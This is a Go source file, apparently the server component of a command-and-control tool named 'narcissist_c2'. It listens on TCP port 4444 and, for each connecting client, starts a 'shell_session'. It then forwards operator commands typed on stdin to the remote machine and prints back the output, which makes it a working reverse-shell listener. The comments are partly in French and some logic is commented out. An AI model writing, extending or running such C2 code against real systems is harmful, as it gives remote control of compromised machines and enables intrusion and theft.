package main

import (
	"bufio"
	"context"
	"fmt"
	"github.com/iyashjayesh/monigo"
	"io"
	"narcissist_c2/server/structs"
	"narcissist_c2/server/utils"
	"net"
	"os"
	"time"
)

var myChan = make(chan bool)

func main() {
	monigoInstance := &monigo.Monigo{
		ServiceName:             "data-api", // Mandatory field
		DashboardPort:           8080,       // Default is 8080
		DataPointsSyncFrequency: "5s",       // Default is 5 Minutes
		DataRetentionPeriod:     "4d",       // Default is 7 days. Supported values: "1h", "1d", "1w", "1m"
		TimeZone:                "Local",    // Default is Local timezone. Supported values: "Local", "UTC", "Asia/Kolkata", "America/New_York" etc. (https://en.wikipedia.org/wiki/List_of_tz_database_time_zones)
		// MaxCPUUsage:             90,         // Default is 95%
		// MaxMemoryUsage:          90,         // Default is 95%
		// MaxGoRoutines:           100,        // Default is 100
	}

	// Trace function, when the function is called, it will be traced and the metrics will be displayed on the dashboard

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	server, err := net.Listen("tcp", ":4444")
	if err != nil {
		panic(err)
	}
	defer server.Close()
	fmt.Println(utils.GetEmoji("listenning") + "Listening on :4444")

	for {
		conn, err := server.Accept()

		if err != nil {
			fmt.Println(utils.GetEmoji("error")+"Error accepting connection:", err)
			panic(err)

		}

		client := structs.Client{ID: 1, Address: conn.RemoteAddr().String(), Conn: conn}
		go ShellSession(client, ctx, cancel, myChan)
		myChan <- true
		time.Sleep(5 * time.Second)
		myChan <- false
	}
}

func ShellSession(client structs.Client, ctx context.Context, cancel context.CancelFunc, ch chan bool) {
	defer fmt.Println("FIN")
	_, err := client.Conn.Write([]byte("{\"type\":\"shell_session\",\"args\":[\"true\"]}\n"))
	if err != nil {
		fmt.Printf(utils.GetEmoji("error")+"Error while starting shell session: %v\n", err)
		return // Sortir immédiatement si une erreur survient
	}

	// Lancer une goroutine pour lire la sortie du client
	go func() {
		_, err := io.Copy(os.Stdout, client.Conn)
		if err != nil {
			fmt.Printf(utils.GetEmoji("error")+"Error copying output from client: %v\n", err)
		}
	}()

	go func() {
		for {
			select {
			case v := <-ch:
				if !v {
					fmt.Println("CHANNEL FALSE")
					cancel()
					return
				}
			case <-ctx.Done():
				return
			}
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)

	for {

		// Lire l'état d'IOState depuis le canal
		//state := <-IOStateCh.ClientIptCh

		// Si IOState est `false`, désactiver la session (quitter la fonction)
		//if !state {
		//	fmt.Println("Shell session deactivated")
		//	return
		//}

		// Lire les commandes tant que la session est active
		//fmt.Print("Enter command: ")
		select {
		case <-ctx.Done():
			fmt.Println("Context cancelled, exiting function")
			return
		default:

			if scanner.Scan() {
				command := scanner.Text()

				// Si la commande est "defocus", on quitte la session
				if command == "defocus" {
					fmt.Println("Shell session terminated by defocus command")
					//		IOStateCh.ClientIptCh <- false
					return
				}

				// Envoyer la commande au client
				command += "\n"
				_, err := client.Conn.Write([]byte(command))
				if err != nil {
					fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
					break // Sortir de la boucle si une erreur survient
				}
			} else {
				// Si la lecture échoue, on quitte la session
				fmt.Println("Scanner error or input closed, exiting shell session")
				return
			}
		}
	}
}
